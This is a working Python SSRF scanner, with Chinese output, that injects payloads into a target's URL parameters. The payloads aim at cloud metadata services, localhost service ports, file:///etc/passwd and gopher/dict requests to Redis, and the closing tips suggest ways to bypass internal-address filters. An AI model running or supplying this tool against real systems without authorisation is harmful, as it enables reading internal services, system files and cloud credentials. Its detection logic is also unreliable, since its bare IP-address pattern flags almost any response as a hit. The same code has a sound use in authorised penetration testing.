#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF漏洞扫描器
检测Web应用中是否存在服务端请求伪造漏洞
"""

import requests
import argparse
import sys
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm

requests.packages.urllib3.disable_warnings()

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

TIMEOUT = 15

CALLBACK_DOMAINS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:9200",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
]

IP_PATTERNS = [
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
    r'root:.*:0:0:',
    r'daemon:.*:1:1:',
    r'bin:.*:2:2:',
    r'ami-id',
    r'instance-id',
    r'public-keys',
    r'security-groups',
    r'local-hostname',
    r'instance-type',
    r'placement',
    r'[PATH]',
    r'\[extensions\]',
    r'\[fonts\]',
]

URL_PARAM_NAMES = [
    'url', 'uri', 'link', 'href', 'path', 'file', 'src',
    'dest', 'destination', 'target', 'redirect', 'proxy',
    'fetch', 'load', 'image', 'img', 'document', 'download',
    'api', 'endpoint', 'callback', 'webhook', 'forward',
    'continue', 'return', 'next', 'host', 'domain', 'ip',
]


def extract_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return {k: v[0] for k, v in params.items()}


def inject_param(url, param_name, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param_name] = [payload]
    new_query = urlencode(params, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urlunparse(new_parsed)


def identify_ssrf_params(url):
    params = extract_params(url)
    ssrf_params = []
    
    for param_name in params:
        if param_name.lower() in URL_PARAM_NAMES:
            ssrf_params.append(param_name)
    
    for param_name in params:
        value = params[param_name]
        if value.startswith(('http://', 'https://', 'ftp://')):
            if param_name not in ssrf_params:
                ssrf_params.append(param_name)
    
    return ssrf_params


def test_ssrf_payload(url, param_name, payload, normal_time, callback_domain):
    test_url = inject_param(url, param_name, payload)
    
    try:
        start_time = time.time()
        response = requests.get(
            test_url,
            headers=DEFAULT_HEADERS,
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=False
        )
        elapsed_time = time.time() - start_time
        
        result = {
            'url': test_url,
            'param': param_name,
            'payload': payload,
            'status_code': response.status_code,
            'response_time': round(elapsed_time, 2),
            'response_length': len(response.text),
            'response_preview': response.text[:500],
        }
        
        for pattern in IP_PATTERNS:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                result['evidence'] = match.group(0)
                result['type'] = '内容回显'
                return result
        
        if elapsed_time > normal_time * 3 and elapsed_time > 3:
            result['evidence'] = f"响应时间异常: {elapsed_time:.2f}秒 (正常: {normal_time:.2f}秒)"
            result['type'] = '时间延迟'
            return result
        
        if response.status_code in [301, 302, 303, 307, 308]:
            result['evidence'] = f"重定向到目标"
            result['type'] = '重定向'
            return result
        
        content_type = response.headers.get('Content-Type', '')
        if 'json' in content_type or 'xml' in content_type:
            if any(keyword in response.text.lower() for keyword in ['error', 'timeout', 'refused', 'invalid', 'denied']):
                result['evidence'] = response.text[:200]
                result['type'] = '错误回显'
                return result
        
        return None
        
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError as e:
        error_msg = str(e)
        if 'Connection refused' in error_msg or 'No route to host' in error_msg:
            return {
                'url': test_url,
                'param': param_name,
                'payload': payload,
                'status_code': 0,
                'response_time': 0,
                'response_length': 0,
                'type': '连接拒绝',
                'evidence': error_msg[:200],
            }
        return None
    except Exception:
        return None


def scan_ssrf_vulnerability(url):
    print(f"[*] 目标URL: {url}")
    
    print(f"[*] 识别SSRF相关参数...")
    ssrf_params = identify_ssrf_params(url)
    
    if not ssrf_params:
        print("[!] 未检测到疑似SSRF参数")
        print("[*] 将对所有参数进行测试...")
        all_params = extract_params(url)
        ssrf_params = list(all_params.keys())
    
    if not ssrf_params:
        print("[!] URL中没有参数")
        return None
    
    print(f"[+] 检测到 {len(ssrf_params)} 个参数: {ssrf_params}")
    
    print(f"[*] 测量正常响应时间...")
    normal_time = 0
    try:
        start = time.time()
        requests.get(url, headers=DEFAULT_HEADERS, timeout=TIMEOUT, verify=False)
        normal_time = time.time() - start
    except:
        normal_time = 1
    print(f"[+] 正常响应时间: {normal_time:.2f}秒")
    
    total_tests = len(ssrf_params) * len(CALLBACK_DOMAINS)
    print(f"[*] 总测试组合: {total_tests}")
    print(f"[*] 开始SSRF漏洞扫描...\n")
    
    results = []
    
    with tqdm(total=total_tests, desc="SSRF扫描进度", unit="test") as pbar:
        for param_name in ssrf_params:
            for payload in CALLBACK_DOMAINS:
                result = test_ssrf_payload(url, param_name, payload, normal_time, payload)
                
                if result and result.get('type'):
                    results.append(result)
                    tqdm.write(f"\n[+] 发现SSRF漏洞!")
                    tqdm.write(f"    参数: {param_name}")
                    tqdm.write(f"    载荷: {payload}")
                    tqdm.write(f"    类型: {result['type']}")
                    if result.get('evidence'):
                        tqdm.write(f"    证据: {result['evidence'][:200]}")
                
                pbar.update(1)
    
    return results


def main():
    parser = argparse.ArgumentParser(
        description="SSRF漏洞扫描器 - 检测Web应用中的服务端请求伪造漏洞",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python scanner.py -u "http://test.com/proxy.php?url=http://example.com"
  python scanner.py -u "http://test.com/fetch.php?target=test"
  python scanner.py -u "http://test.com/api.php?endpoint=http://test.com" -o result.txt
        """
    )
    
    parser.add_argument("-u", "--url", required=True,
                        help="目标URL（包含参数）")
    parser.add_argument("-o", "--output",
                        help="结果输出文件路径")
    
    args = parser.parse_args()
    
    print("=" * 50)
    print("SSRF漏洞扫描器")
    print("=" * 50)
    
    results = scan_ssrf_vulnerability(args.url)
    
    print(f"\n{'=' * 50}")
    if results:
        print(f"[+] 扫描完成！发现 {len(results)} 个SSRF漏洞")
        print("=" * 50)
        
        type_count = {}
        for r in results:
            t = r['type']
            type_count[t] = type_count.get(t, 0) + 1
        
        for t, count in type_count.items():
            print(f"  {t}: {count} 个")
        
        print(f"\n详细信息:")
        for i, result in enumerate(results, 1):
            print(f"\n{'─' * 40}")
            print(f"漏洞 {i}:")
            print(f"  URL: {result['url']}")
            print(f"  参数: {result['param']}")
            print(f"  载荷: {result['payload']}")
            print(f"  类型: {result['type']}")
            if result.get('evidence'):
                print(f"  证据: {result['evidence'][:300]}")
    else:
        print("[-] 未发现SSRF漏洞")
        print("=" * 50)
    
    if args.output and results:
        with open(args.output, 'w', encoding='utf-8') as f:
            for result in results:
                f.write(f"类型: {result['type']}\n")
                f.write(f"URL: {result['url']}\n")
                f.write(f"参数: {result['param']}\n")
                f.write(f"载荷: {result['payload']}\n")
                if result.get('evidence'):
                    f.write(f"证据: {result['evidence']}\n")
                f.write("\n")
        print(f"\n[+] 结果已保存到: {args.output}")
    
    if not results:
        print("\n[*] 提示：")
        print("    1. SSRF可能存在于POST参数、Header中，需手工测试")
        print("    2. 目标可能过滤了内网地址，尝试URL编码、短网址等绕过")
        print("    3. 部分SSRF需要外带数据，可配合DNSlog平台验证")


if __name__ == "__main__":
    main()